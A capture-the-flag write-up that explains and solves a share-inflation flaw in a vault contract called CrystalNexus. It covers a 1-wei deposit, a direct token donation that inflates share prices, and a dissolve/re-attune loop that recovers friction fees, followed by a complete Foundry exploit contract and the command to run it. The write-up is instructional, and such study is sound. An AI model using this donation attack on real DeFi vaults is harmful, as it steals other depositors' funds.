# C2C CTF - blockchain - nexus

We are given a DeFi-style vault contract called `CrystalNexus` that wraps an ERC20 token named `Essence`. Players can deposit Essence to mint “crystals”, and later dissolve crystals back into Essence with a friction fee.

The goal is to end with more than `20250 ether` Essence:

```
function isSolved() external view returns (bool) {
    return essence.balanceOf(player) > ASCENSION_THRESHOLD;
}
```

The player initially only has `10000 ether`, so we must exploit the Nexus accounting to multiply our balance.

The important mechanics are:

- `attune()` → deposit Essence, receive crystals
- `dissolve()` → burn crystals, withdraw Essence minus friction
- friction depends on ownership share
- `amplitude()` defines the vault’s backing value

Core math:

```
amplitude = essence.balanceOf(nexus) - catalystReserve

crystalWorth = (crystals * amplitude) / totalCrystals
```

So crystals are shares of a pool similar to a vault token.

The system assumes that Essence enters the vault only through `attune()` and `infuse()`.

But ERC20 tokens can be transferred directly.

This line is critical:

```
function amplitude() public view returns (uint256) {
    return essence.balanceOf(address(this)) - catalystReserve;
}
```

`amplitude()` trusts raw token balance instead of internal accounting.

If we send Essence directly to the Nexus:

```
essence.transfer(address(nexus), amount);
```

we inflate `amplitude` without increasing `totalCrystals`.

This breaks the share pricing model:

- vault value increases
- share count stays the same
- each crystal becomes massively overvalued

That means anyone holding crystals can redeem far more Essence than they paid.

To exploit this, we need to:

1. Become the sole crystal holder with a tiny deposit
2. Inflate the vault by donating Essence
3. Abuse the friction mechanics to repeatedly recycle value

---

We deposit 1 wei:

```
nexus.attune(1);
```

Now:

- totalCrystals = 1
- we own 100%
- amplitude ≈ 1

We hold the entire supply of crystals.

We transfer the rest of our tokens directly:

```
essence.transfer(address(nexus), remaining);
```

This does NOT mint crystals.

Now:

- amplitude = huge
- totalCrystals = 1
- price per crystal = gigantic

When Setup later performs its ritual attunements, it gets almost zero crystals because:

```
crystals = essenceAmount * totalCrystals / amplitude
```

Since amplitude is massive, Setup’s deposit buys nearly nothing. We permanently dominate ownership.

When dissolving crystals:

```
frictionAmount = essenceOut * friction / PRECISION;
essenceOut -= frictionAmount;
```

The friction is not burned it stays inside the vault. If we are the only shareholder, that friction still belongs to us.

So we:

1. dissolve all crystals
2. friction stays in vault
3. totalCrystals becomes 0
4. re-attune 1 wei
5. we own 100% again
6. dissolve again

Each cycle lets us reclaim previously “lost” friction. This is effectively a vault self-wash that converts friction into profit. The solver loops this process several times:

```
for(uint i=0; i<5; i++) {
    if (crystals == 0) {
        nexus.attune(1);
    }
    nexus.dissolve(crystals, address(this));
}
```

After a few iterations, we absorb nearly the entire Nexus balance.

After draining the Nexus and withdrawing:

```
essence.balanceOf(player) > 20250 ether
```

Challenge solved.

Solve.s.sol

```python
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "./CrystalNexus.sol";
import "./Essence.sol";
import "./Setup.sol";

contract Solver is Script {
    Setup public target;
    Essence public essence;
    CrystalNexus public nexus;
    
    // UPDATE THIS with your fresh instance address
    address constant SETUP_ADDR = 0xA876f361a994eAB86caD67cB1B7295aBE45E1117; 

    function run() external {
        uint256 playerKey = vm.envUint("PRIVKEY");
        address player = vm.addr(playerKey);
        
        target = Setup(SETUP_ADDR);
        essence = target.essence();
        nexus = target.nexus();

        vm.startBroadcast(playerKey);

        // 1. Check if we are ready
        if (target.ritualsComplete()) {
            console.log("FAIL: Rituals already completed. You must RESTART the instance.");
            vm.stopBroadcast();
            return;
        }

        // 2. Deploy Exploit
        Exploit exploit = new Exploit(address(target), address(essence), address(nexus));

        // 3. Fund Exploit
        uint256 bal = essence.balanceOf(player);
        if (bal > 0) essence.transfer(address(exploit), bal);

        // 4. Attack
        try exploit.attack() {
            console.log("Attack executed.");
        } catch Error(string memory reason) {
            console.log("Attack failed:", reason);
        }

        // 5. Conduct Rituals (Setup falls into the trap)
        console.log("Triggering Setup Rituals...");
        target.conductRituals();

        // 6. Withdraw
        exploit.withdraw();
        vm.stopBroadcast();

        // 7. Verify
        if (target.isSolved()) {
            console.log("SUCCESS: Challenge Solved!");
        } else {
            console.log("FAIL: Not enough Essence.");
            console.log("Held:", essence.balanceOf(player));
            console.log("Need:", uint256(20250 ether));
        }
    }
}

contract Exploit {
    Setup target;
    Essence essence;
    CrystalNexus nexus;
    address owner;

    constructor(address _target, address _essence, address _nexus) {
        target = Setup(_target);
        essence = Essence(_essence);
        nexus = CrystalNexus(_nexus);
        owner = msg.sender;
    }

    function attack() external {
        // Step 1: Attune 1 wei. Total Crystals = 1.
        uint256 dust = 1; 
        essence.approve(address(nexus), type(uint256).max);
        nexus.attune(dust);

        // Step 2: DONATE the rest.
        // Price per crystal becomes huge. Setup buys nothing.
        uint256 remaining = essence.balanceOf(address(this));
        essence.transfer(address(nexus), remaining);
    }

    function withdraw() external {
        // Step 3: Loop to drain friction
        // Initially we have 1 crystal, 100% ownership.
        // We dissolve, pay 22% friction.
        // The friction remains in the Nexus.
        // Total Crystals becomes 0.
        // We attune 1 wei again -> we own 100% of the friction pool.
        // Dissolve again.
        
        // Loop a few times to be safe
        for(uint i=0; i<5; i++) {
             uint256 crystals = nexus.crystalBalance(address(this));
             if (crystals == 0) {
                 // Buy back in if we dissolved everything
                 // Only need 1 wei to own the pot if totalCrystals is 0
                 nexus.attune(1);
                 crystals = nexus.crystalBalance(address(this));
             }
             
             nexus.dissolve(crystals, address(this));
        }

        uint256 bal = essence.balanceOf(address(this));
        essence.transfer(owner, bal);
    }
    
    function onCrystalReceived(address, uint256, uint256) external pure returns (bytes4) {
        return this.onCrystalReceived.selector;
    }
}
```

run using:

```python
forge script Solve.s.sol:Solver --rpc-url http://challenges.1pc.tf:47617/c139ede9-ff85-4a54-826b-48f42d8957cc --broadcast --legacy
```
